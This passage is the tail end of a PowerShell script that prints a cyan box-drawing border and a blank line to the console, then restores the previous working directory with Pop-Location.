Write-Host "╚══════════════════════════════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

Pop-Location
